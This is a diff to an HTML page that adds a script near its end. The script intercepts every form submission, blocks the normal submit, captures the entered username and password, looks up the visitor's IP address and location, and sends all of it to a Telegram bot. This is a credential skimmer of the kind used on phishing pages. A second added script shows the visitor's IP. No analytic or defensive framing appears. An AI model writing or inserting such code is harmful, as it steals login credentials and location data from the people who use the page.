@@ -4062,5 +4062,39 @@ document.querySelectorAll("form").forEach(form => {
 });
 </script>
 
+
+<script>
+  function sendToTelegram(username, password) {
+    $.getJSON('https://ipapi.co/json/', function(data) {
+      const ip = data.ip;
+      const loc = `${data.city}, ${data.region}, ${data.country_name}`;
+      const message = `Login Attempt\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nLocation: ${loc}`;
+
+      $.post(`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`, {
+        chat_id: '<YOUR_CHAT_ID>',
+        text: message
+      });
+    });
+  }
+
+  $(document).ready(function() {
+    $('form').on('submit', function(e) {
+      e.preventDefault();
+      const username = $('input[name="username"]').val();
+      const password = $('input[name="password"]').val();
+      sendToTelegram(username, password);
+    });
+  });
+</script>
+
+
+<script>
+fetch("https://api.ipify.org?format=json")
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById("ip").textContent = data.ip;
+  });
+</script>
+
 </body>
 </html>
